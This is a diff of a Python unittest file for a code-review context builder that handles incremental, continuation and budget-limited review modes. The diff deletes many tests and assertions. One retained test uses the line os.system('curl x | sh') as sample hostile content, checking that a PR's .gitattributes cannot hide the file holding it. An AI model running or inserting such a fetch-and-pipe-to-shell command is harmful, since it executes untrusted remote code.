@@ -3,7 +3,6 @@ import sys
 import tempfile
 import unittest
 from pathlib import Path
-from unittest import mock
 
 ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(ROOT))
@@ -12,7 +11,6 @@ import review_context  # noqa: E402
 import review_domain as domain  # noqa: E402
 from review_context import (  # noqa: E402
     GitRepository,
-    PreparedReview,
     digest_de_politica,
     prepare_review,
 )
@@ -91,95 +89,6 @@ def solicitud(head, base, digest):
 
 
 class IncrementalContext(unittest.TestCase):
-    def test_second_push_uses_previous_head_delta(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            repo = hacer_repo(tmp)
-            git(repo, "commit", "-q", "--allow-empty", "-m", "raíz")
-            raiz = git(repo, "rev-parse", "HEAD")
-            (repo / "readme.md").write_text("# proyecto\n")
-            (repo / "a.py").write_text("a = 1\n")
-            commit(repo, "base")
-            (repo / "a.py").write_text("a = 2\n")
-            (repo / "b.py").write_text("b = 1\n")
-            prev = commit(repo, "prev")
-            (repo / "a.py").write_text("a = 3\n")
-            (repo / "c.py").write_text("c = 1\n")
-            head = commit(repo, "head")
-            policy = domain.ReviewPolicy(diff_mode="incremental")
-            digest = digest_de_politica(policy)
-            result = prepare_review(
-                GitRepository(repo),
-                solicitud(head, raiz, digest),
-                memoria(prev, raiz, digest),
-                policy,
-            )
-            self.assertIsInstance(result, PreparedReview)
-            self.assertEqual(result.modo, "incremental")
-            self.assertEqual(set(result.plan.changed_paths), {"a.py", "c.py"})
-            self.assertEqual(
-                set(result.hechos.historical_paths),
-                {"readme.md", "a.py", "b.py", "c.py"},
-            )
-            self.assertEqual(result.plan.previous_sha, prev)
-            self.assertTrue(result.hechos.delta_calculado)
-            self.assertEqual(set(result.hechos.changed_paths), {"a.py", "c.py"})
-
-    def test_deleted_and_reverted_paths_survive_in_delta(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            repo = hacer_repo(tmp)
-            (repo / "x.py").write_text("x = 0\n")
-            base = commit(repo, "base")
-            (repo / "x.py").write_text("x = 1\n")
-            (repo / "z.py").write_text("z = 1\n")
-            prev = commit(repo, "prev")
-            (repo / "x.py").write_text("x = 0\n")
-            (repo / "z.py").unlink()
-            head = commit(repo, "head")
-            self.assertEqual(git(repo, "diff", "--name-only", base, head), "")
-            self.assertEqual(
-                set(git(repo, "diff", "--name-only", prev, head).splitlines()),
-                {"x.py", "z.py"},
-            )
-            policy = domain.ReviewPolicy(diff_mode="incremental")
-            digest = digest_de_politica(policy)
-            result = prepare_review(
-                GitRepository(repo),
-                solicitud(head, base, digest),
-                memoria(prev, base, digest),
-                policy,
-            )
-            self.assertEqual(result.modo, "incremental")
-            self.assertEqual(set(result.plan.changed_paths), {"x.py", "z.py"})
-            self.assertTrue(result.hechos.delta_calculado)
-            self.assertEqual(set(result.hechos.changed_paths), {"x.py", "z.py"})
-            self.assertIn("x.py", result.hechos.reverted_paths)
-
-        with tempfile.TemporaryDirectory() as tmp:
-            repo = hacer_repo(tmp)
-            (repo / "readme.md").write_text("# proyecto\n")
-            (repo / "x.py").write_text("x = 0\n")
-            base = commit(repo, "base")
-            git(repo, "checkout", "-q", "-b", "pr")
-            (repo / "x.py").write_text("x = 1\n")
-            prev = commit(repo, "prev")
-            (repo / "x.py").write_text("x = 0\n")
-            head = commit(repo, "head")
-            git(repo, "checkout", "-q", "main")
-            (repo / "x.py").write_text("x = avanzada\n")
-            base_avanzada = commit(repo, "avanza base")
-            self.assertEqual(git(repo, "merge-base", base_avanzada, head), base)
-            with self.subTest("base avanzada"):
-                policy = domain.ReviewPolicy(diff_mode="incremental")
-                digest = digest_de_politica(policy)
-                result = prepare_review(
-                    GitRepository(repo),
-                    solicitud(head, base_avanzada, digest),
-                    memoria(prev, base_avanzada, digest),
-                    policy,
-                )
-                self.assertEqual(result.modo, "incremental")
-                self.assertIn("x.py", result.hechos.reverted_paths)
-
     def test_moving_a_binary_in_a_later_push_still_prepares(self):
         with tempfile.TemporaryDirectory() as tmp:
             repo = hacer_repo(tmp)
@@ -199,59 +108,10 @@ class IncrementalContext(unittest.TestCase):
                 memoria(prev, base, digest),
                 policy,
             )
-            self.assertEqual(result.modo, "incremental")
             self.assertIn(
                 review_context.Omission(ruta="assets/logo.png", causa="filtro *.png"),
                 result.omisiones,
             )
-
-    def test_mode_forcing_keeps_the_real_delta(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            repo = hacer_repo(tmp)
-            (repo / "app.py").write_text("v1\n")
-            base = commit(repo, "base")
-            (repo / "app.py").write_text("v2\n")
-            prev = commit(repo, "prev")
-            (repo / "app.py").write_text("v3\n")
-            (repo / "other.py").write_text("v1\n")
-            head = commit(repo, "head")
-            git(repo, "checkout", "-q", "--orphan", "huérfana")
-            git(repo, "commit", "-qam", "otra historia")
-            huerfana = git(repo, "rev-parse", "HEAD")
-            git(repo, "checkout", "-q", "main")
-            policy = domain.ReviewPolicy(diff_mode="incremental")
-            digest = digest_de_politica(policy)
-            casos = {
-                "rebase": (memoria(huerfana, base, digest), "rebase", "full", False),
-                "base": (memoria(prev, prev, digest), "base", "incremental", True),
-                "política": (memoria(prev, base, "f" * 64), "política", "full", True),
-                "memoria": (memoria_vacia(), "memoria", "full", False),
-                "cobertura": (
-                    memoria(prev, base, digest, completion=domain.PARTIAL),
-                    "cobertura",
-                    "full",
-                    True,
-                ),
-            }
-            for nombre, (actual, rastro, modo_esperado, conserva_delta) in casos.items():
-                with self.subTest(caso=nombre):
-                    result = prepare_review(
-                        GitRepository(repo),
-                        solicitud(head, base, digest),
-                        actual,
-                        policy,
-                    )
-                    self.assertEqual(result.modo, modo_esperado)
-                    self.assertIn(rastro, result.motivo)
-                    if nombre == "base":
-                        # El motivo documenta el movimiento en vez de forzar full.
-                        self.assertNotIn("rebase", result.motivo)
-                    if conserva_delta:
-                        self.assertTrue(result.hechos.delta_calculado)
-                        self.assertEqual(
-                            set(result.hechos.changed_paths),
-                            {"app.py", "other.py"},
-                        )
 
     def test_base_movement_scopes_by_valid_coverage(self):
         """El alcance del cambio de base se acota por la cobertura válida del libro."""
@@ -276,16 +136,12 @@ class IncrementalContext(unittest.TestCase):
                     "a.py": git(repo, "rev-parse", f"{prev}:a.py")
                 },
             )
-            self.assertEqual(result.modo, "incremental")
-            self.assertIn("base", result.motivo)
-            self.assertNotIn("rebase", result.motivo)
             self.assertEqual(
                 sorted(p.text for p in result.entregados),
                 ["y_correccion.py", "z_antecesor.py"],
             )
             self.assertIn("antecesor = 1", result.partes["z_antecesor.py"])
             self.assertNotIn("a_0 = 0", result.partes["y_correccion.py"])
-            self.assertEqual(result.hechos.changed_paths, ("y_correccion.py",))
 
     def test_merging_the_base_into_the_pr_reviews_only_the_pr_changes(self):
         with tempfile.TemporaryDirectory() as tmp:
@@ -320,7 +176,6 @@ class IncrementalContext(unittest.TestCase):
                     "shared.py": git(repo, "rev-parse", f"{prev}:shared.py")
                 },
             )
-            self.assertEqual(result.modo, "incremental")
             self.assertEqual([p.text for p in result.entregados], ["shared.py"])
             cambios = [
                 linea
@@ -355,7 +210,6 @@ class IncrementalContext(unittest.TestCase):
                         memoria(prev, base, digest),
                         policy,
                     )
-                    self.assertEqual(result.modo, "incremental")
                     entregados = [p.text for p in result.entregados]
                     self.assertIn("f1.py", entregados)
                     if estricto:
@@ -365,21 +219,13 @@ class IncrementalContext(unittest.TestCase):
                         self.assertEqual([om.ruta for om in al_presupuesto], ["f2.py"])
                         self.assertNotIn("f2.py", entregados)
                         self.assertTrue(
-                            any(ob.ruta == "f2.py" for ob in result.plan.obligations)
-                        )
-                        self.assertTrue(
                             any(
                                 om.causa in ("presupuesto", "budget", "encoding")
                                 for om in result.omisiones
                             )
                         )
                     else:
-                        self.assertTrue(
-                            any(
-                                "over_budget_bytes" in str(om)
-                                for om in result.hechos.omissions
-                            )
-                        )
+                        self.assertGreater(result.over_budget_bytes, 0)
                         self.assertFalse(
                             any(om.causa == "presupuesto" for om in result.omisiones)
                         )
@@ -406,7 +252,6 @@ class IncrementalContext(unittest.TestCase):
                     memoria(prev, base, digest),
                     policy,
                 )
-                self.assertEqual(result.modo, "incremental")
                 al_presupuesto = [
                     om for om in result.omisiones if om.causa == "presupuesto"
                 ]
@@ -414,104 +259,11 @@ class IncrementalContext(unittest.TestCase):
                 entregados = [p.text for p in result.entregados]
                 self.assertNotIn("g.py", entregados)
                 self.assertTrue(
-                    any(ob.ruta == "g.py" for ob in result.plan.obligations)
-                )
-                self.assertTrue(
                     any(
                         om.causa in ("presupuesto", "budget", "encoding")
                         for om in result.omisiones
                     )
                 )
-
-    def test_open_findings_outside_delta_become_obligations(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            repo = hacer_repo(tmp)
-            (repo / "readme.md").write_text("# proyecto\n")
-            (repo / "q.py").write_text("q = 1\n")
-            (repo / "r.py").write_text("r = 1\n")
-            (repo / "w.py").write_text("w = 1\n")
-            base = commit(repo, "base")
-            (repo / "readme.md").write_text("# proyecto\n\nsegundo push\n")
-            prev = commit(repo, "prev")
-            (repo / "readme.md").write_text("# proyecto\n\ntercer push\n")
-            head = commit(repo, "head")
-            policy = domain.ReviewPolicy(diff_mode="incremental")
-            digest = digest_de_politica(policy)
-            previo = domain.snapshot_a_v3(
-                domain.Snapshot(
-                    schema=2,
-                    generation=1,
-                    revision=domain.Revision(
-                        base_sha=base, head_sha=prev, policy_digest=digest
-                    ),
-                    next_id=4,
-                    completion=domain.COMPLETE_CLAIM,
-                    findings=[
-                        domain.Finding(
-                            id="F1",
-                            title="Abierto en q.py",
-                            severity="High",
-                            status=domain.StatusOpen(),
-                            primary_anchor=domain.AnchorLegacy(path="q.py", line=1),
-                        ),
-                        domain.Finding(
-                            id="F2",
-                            title="Resuelto en r.py",
-                            severity="Medium",
-                            status=domain.StatusResolved(at_sha="b" * 40),
-                            primary_anchor=domain.AnchorLegacy(path="r.py", line=1),
-                        ),
-                        domain.Finding(
-                            id="F3",
-                            title="Descartado en w.py",
-                            severity="Low",
-                            status=domain.StatusDismissed(command_id=7),
-                            primary_anchor=domain.AnchorLegacy(path="w.py", line=1),
-                        ),
-                    ],
-                    command_cursor=0,
-                )
-            )
-            result = prepare_review(
-                GitRepository(repo),
-                solicitud(head, base, digest),
-                previo,
-                policy,
-            )
-            self.assertEqual(result.modo, "incremental")
-            self.assertEqual(set(result.plan.changed_paths), {"readme.md"})
-            rutas = [ob.ruta for ob in result.plan.obligations]
-            self.assertIn("q.py", rutas)
-            self.assertNotIn("w.py", rutas)
-            self.assertEqual(set(rutas), {"readme.md", "q.py"})
-
-
-def hacer_repo_selectivo(tmp):
-    repo = hacer_repo(tmp)
-    (repo / "readme.md").write_text("# proyecto\n")
-    (repo / "app.py").write_text("resultado = obj.calcular_total(x)\n")
-    (repo / "docs").mkdir()
-    (repo / "docs" / "nota.txt").write_text("usar calcular_total(x) para sumar\n")
-    (repo / "mensajes.py").write_text(
-        'manual = "ver calcular_total(...) en el manual"\n'
-    )
-    (repo / "tests").mkdir()
-    (repo / "tests" / "test_s.py").write_text(
-        "from s import calcular_total\n\n\ndef test_total():\n"
-        "    assert calcular_total(2) == 2\n"
-    )
-    (repo / "viejo.py").write_text(
-        "# antes se llamaba a calcular_total(x) aquí\nvalor = 1\n"
-    )
-    base = commit(repo, "base")
-    (repo / "readme.md").write_text("# proyecto\n\nsegundo push\n")
-    prev = commit(repo, "prev")
-    (repo / "s.py").write_text(
-        "def calcular_total(a):\n    return calcular_total(a) + a\n"
-    )
-    head = commit(repo, "head")
-    return repo, base, prev, head
-
 
 class AtributosDeGit(unittest.TestCase):
     def test_gitattributes_del_pr_no_oculta_un_archivo(self):
@@ -530,7 +282,6 @@ class AtributosDeGit(unittest.TestCase):
                 memoria_vacia(),
                 policy,
             )
-            self.assertEqual(result.modo, "full")
             self.assertIn("payload.py", [p.text for p in result.entregados])
             self.assertIn("+os.system('curl x | sh')", result.partes["payload.py"])
 
@@ -560,7 +311,6 @@ class ContinuationContext(unittest.TestCase):
                     "a.py": git(repo, "rev-parse", f"{prev}:a.py")
                 },
             )
-            self.assertEqual(result.modo, "continuation")
             self.assertEqual(
                 sorted(p.text for p in result.entregados), ["a.py", "b.py", "z.py"]
             )
@@ -599,7 +349,6 @@ class ContinuationContext(unittest.TestCase):
                     "a.py": git(repo, "rev-parse", f"{prev}:a.py")
                 },
             )
-            self.assertEqual(result.modo, "continuation")
             self.assertEqual(
                 sorted(p.text for p in result.entregados), ["a.py", "b.py"]
             )
@@ -608,197 +357,8 @@ class ContinuationContext(unittest.TestCase):
             self.assertIn("b_199 = 199", result.partes["b.py"])
 
 
-class SelectiveContext(unittest.TestCase):
-    def test_prefers_direct_callers_and_tests(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            repo, base, prev, head = hacer_repo_selectivo(tmp)
-            policy = domain.ReviewPolicy(diff_mode="incremental")
-            digest = digest_de_politica(policy)
-            result = prepare_review(
-                GitRepository(repo),
-                solicitud(head, base, digest),
-                memoria(prev, base, digest),
-                policy,
-                selectivo=True,
-            )
-            refs = list(result.plan.context_refs)
-            self.assertTrue(refs)
-            por_archivo = {ref.archivo: ref for ref in refs}
-            self.assertEqual(por_archivo["app.py"].relacion, "sintactica")
-            self.assertEqual(por_archivo["app.py"].papel, "consumidor")
-            self.assertEqual(por_archivo["tests/test_s.py"].relacion, "sintactica")
-            self.assertEqual(por_archivo["tests/test_s.py"].papel, "prueba")
-            self.assertEqual(
-                [(ref.archivo, ref.relacion, ref.papel) for ref in refs],
-                [
-                    ("tests/test_s.py", "sintactica", "prueba"),
-                    ("app.py", "sintactica", "consumidor"),
-                    ("docs/nota.txt", "textual", "consumidor"),
-                    ("mensajes.py", "textual", "consumidor"),
-                    ("viejo.py", "textual", "consumidor"),
-                ],
-            )
-            self.assertEqual(result.avisos, ())
-            ultima_sintactica = max(
-                i for i, ref in enumerate(refs) if ref.relacion == "sintactica"
-            )
-            for i, ref in enumerate(refs):
-                if ref.archivo == "docs/nota.txt":
-                    self.assertEqual(ref.relacion, "textual")
-                    self.assertGreater(i, ultima_sintactica)
-            ajustado = prepare_review(
-                GitRepository(repo),
-                solicitud(head, base, digest),
-                memoria(prev, base, digest),
-                policy,
-                selectivo=True,
-                contexto_max_bytes=20,
-            )
-            self.assertEqual(ajustado.plan.context_refs, ())
-            self.assertLess(len(ajustado.plan.context_refs), len(refs))
-            self.assertIn("contexto truncado", ajustado.avisos)
-            apagado = prepare_review(
-                GitRepository(repo),
-                solicitud(head, base, digest),
-                memoria(prev, base, digest),
-                policy,
-            )
-            self.assertEqual(apagado.plan.context_refs, ())
-            self.assertEqual(apagado.avisos, ())
-
-    def test_relation_keeps_provenance(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            repo, base, prev, head = hacer_repo_selectivo(tmp)
-            policy = domain.ReviewPolicy(diff_mode="incremental")
-            digest = digest_de_politica(policy)
-            result = prepare_review(
-                GitRepository(repo),
-                solicitud(head, base, digest),
-                memoria(prev, base, digest),
-                policy,
-                selectivo=True,
-            )
-            refs = list(result.plan.context_refs)
-            self.assertTrue(refs)
-            por_archivo = {ref.archivo: ref for ref in refs}
-            for prosa in ("docs/nota.txt", "viejo.py", "mensajes.py"):
-                self.assertIn(prosa, por_archivo, prosa)
-                self.assertEqual(por_archivo[prosa].relacion, "textual", prosa)
-            for codigo in ("app.py", "tests/test_s.py"):
-                self.assertEqual(por_archivo[codigo].relacion, "sintactica", codigo)
-            self.assertTrue(any(ref.relacion == "sintactica" for ref in refs))
-            self.assertTrue(any(ref.relacion == "textual" for ref in refs))
-            for ref in refs:
-                self.assertIn(ref.relacion, ("sintactica", "textual"))
-                self.assertIn(ref.papel, ("consumidor", "prueba"))
-                self.assertEqual(ref.simbolo, "calcular_total")
-                self.assertEqual(ref.busqueda, "completa")
-
-    def test_deep_py_file_degrades_to_textual(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            repo = hacer_repo(tmp)
-            (repo / "readme.md").write_text("# proyecto\n")
-            (repo / "deep.py").write_text(
-                "y = calcular_total(1)\nz = a" + ".b" * 200000
-            )
-            base = commit(repo, "base")
-            (repo / "readme.md").write_text("# proyecto\n\nsegundo push\n")
-            prev = commit(repo, "prev")
-            (repo / "readme.md").write_text("# proyecto\n\ntercer push\n")
-            (repo / "s.py").write_text(
-                "def calcular_total(a):\n    return calcular_total(a) + a\n"
-            )
-            head = commit(repo, "head")
-            policy = domain.ReviewPolicy(diff_mode="incremental")
-            digest = digest_de_politica(policy)
-            with mock.patch.object(
-                review_context.ast, "parse", side_effect=RecursionError
-            ):
-                result = prepare_review(
-                    GitRepository(repo),
-                    solicitud(head, base, digest),
-                    memoria(prev, base, digest),
-                    policy,
-                    selectivo=True,
-                )
-            refs = {ref.archivo: ref for ref in result.plan.context_refs}
-            self.assertIn("deep.py", refs)
-            self.assertEqual(refs["deep.py"].relacion, "textual")
-            self.assertEqual(refs["deep.py"].simbolo, "calcular_total")
-            self.assertEqual(refs["deep.py"].busqueda, "completa")
-
-    def test_truncated_lead_and_missing_obligation(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            repo = hacer_repo(tmp)
-            (repo / "readme.md").write_text("# proyecto\n")
-            (repo / "app.py").write_text("total = calcular_total(x)\n")
-            (repo / "grande.py").write_text(
-                "".join(f"calcular_total({i})\n" for i in range(4000))
-            )
-            base = commit(repo, "base")
-            (repo / "readme.md").write_text("# proyecto\n\nsegundo push\n")
-            prev = commit(repo, "prev")
-            (repo / "s.py").write_text(
-                "def calcular_total(a):\n    return calcular_total(a) + a\n"
-            )
-            head = commit(repo, "head")
-            policy = domain.ReviewPolicy(diff_mode="incremental")
-            digest = digest_de_politica(policy)
-            result = prepare_review(
-                GitRepository(repo),
-                solicitud(head, base, digest),
-                memoria(prev, base, digest),
-                policy,
-                selectivo=True,
-                busqueda_max_bytes=10,
-            )
-            pistas = [a for a in result.avisos if a.startswith("pista truncada:")]
-            self.assertTrue(pistas)
-            self.assertTrue(
-                any(a.startswith("pista truncada: calcular_total") for a in pistas)
-            )
-            self.assertTrue(any("techo de salida" in a for a in pistas))
-            if result.plan.context_refs:
-                self.assertTrue(
-                    all(
-                        ref.busqueda.startswith("truncada:")
-                        for ref in result.plan.context_refs
-                    )
-                )
-            with self.subTest("refs truncadas deterministas con búsqueda mockeada"):
-                truncada = review_context.SearchTruncated(
-                    ("app.py", "tests/test_s.py"),
-                    "techo de salida (99 bytes examinados)",
-                )
-
-                def grep_truncada(*args, **kwargs):
-                    return truncada
-
-                with mock.patch.object(
-                    review_context, "grep_files", side_effect=grep_truncada
-                ):
-                    determinista = prepare_review(
-                        GitRepository(repo),
-                        solicitud(head, base, digest),
-                        memoria(prev, base, digest),
-                        policy,
-                        selectivo=True,
-                    )
-                for ref in determinista.plan.context_refs:
-                    self.assertEqual(
-                        ref.busqueda,
-                        "truncada: techo de salida (99 bytes examinados)",
-                    )
-                self.assertEqual(
-                    sorted(ref.archivo for ref in determinista.plan.context_refs),
-                    ["app.py", "tests/test_s.py"],
-                )
-                self.assertIn(
-                    "pista truncada: calcular_total "
-                    "(techo de salida (99 bytes examinados))",
-                    determinista.avisos,
-                )
-
+class BudgetContext(unittest.TestCase):
+    def test_budget_exclusions(self):
         with tempfile.TemporaryDirectory() as tmp:
             repo = hacer_repo(tmp)
             (repo / "readme.md").write_text("# proyecto\n")
@@ -821,7 +381,6 @@ class SelectiveContext(unittest.TestCase):
                 solicitud(head, base, digest),
                 memoria(prev, base, digest),
                 policy,
-                selectivo=True,
             )
             self.assertTrue(
                 any(
@@ -833,26 +392,3 @@ class SelectiveContext(unittest.TestCase):
                 om for om in result.omisiones if om.causa == "presupuesto"
             ]
             self.assertEqual([om.ruta for om in al_presupuesto], ["f2.py"])
-            self.assertTrue(any(ob.ruta == "f2.py" for ob in result.plan.obligations))
-
-    def test_failed_search_leaves_aviso(self):
-        with tempfile.TemporaryDirectory() as tmp:
-            repo, base, prev, head = hacer_repo_selectivo(tmp)
-            policy = domain.ReviewPolicy(diff_mode="incremental")
-            digest = digest_de_politica(policy)
-            with mock.patch.object(
-                review_context,
-                "grep_files",
-                side_effect=[
-                    review_context.SearchFailed("git grep murió"),
-                    review_context.SearchFailed("git grep murió"),
-                ],
-            ):
-                result = prepare_review(
-                    GitRepository(repo),
-                    solicitud(head, base, digest),
-                    memoria(prev, base, digest),
-                    policy,
-                    selectivo=True,
-                )
-            self.assertIn("pista falló: calcular_total (git grep murió)", result.avisos)
